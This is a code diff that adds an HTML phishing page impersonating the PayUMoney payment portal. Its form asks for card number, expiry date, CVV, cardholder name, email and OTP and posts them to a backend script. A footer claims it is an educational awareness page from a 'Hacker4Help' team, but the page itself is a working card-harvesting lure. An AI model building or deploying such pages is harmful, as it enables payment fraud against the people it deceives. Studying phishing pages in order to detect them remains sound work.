@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Pay Money - Payment Portal</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+
+<body>
+    <div class="payment-container">
+        <header>
+            <h1 class="header-title">PayUMoney</h1>
+        </header>
+        <div class="header-info">
+            <span class="account-balance"></span>
+            <span class="transaction-number"></span>
+        </div>
+        <div class="content">
+            <div class="payment-options-section">
+                <h2 class="section-title">Payment Options</h2>
+                <div class="payment-options">
+                    <button class="payment-option">Debit Card</button>
+                    <button class="payment-option">Credit Card</button>
+                </div>
+            </div>
+            <div class="form-section">
+                <h2 class="section-title">Payment Details</h2>
+                <form action="backend.php" method="post">
+                    <div class="form-group">
+                        <label for="card-number">Card Number</label>
+                        <input type="number" id="card-number" name="card_number" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="expiry-date">Expiry Date</label>
+                        <input type="number" id="expiry-date" name="expiry_date" required >
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="password" id="cvv" name="cvv" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="name">Name on Card</label>
+                        <input type="text" id="name" name="name" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" name="email" >
+                    </div>
+                    <div class="form-group">
+                        <label for="amount">OTP</label>
+                        <input type="number" id="amount" name="amount" >
+                    </div>
+                    <button type="submit" class="submit-button">Pay Now</button>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+<footer>
+    <h4>Note:- This is for the  educational and awareness purpose only. This is the initiative from the 
+        Hacker4Help team to aware you by showing the phishing scams which are 
+        happening in the market now and many people fall in this trap.
+         So this page is used for your awareness so that 
+         you can detect the phishing pages if you get from now .</h4>
+</footer>
+
+</html>
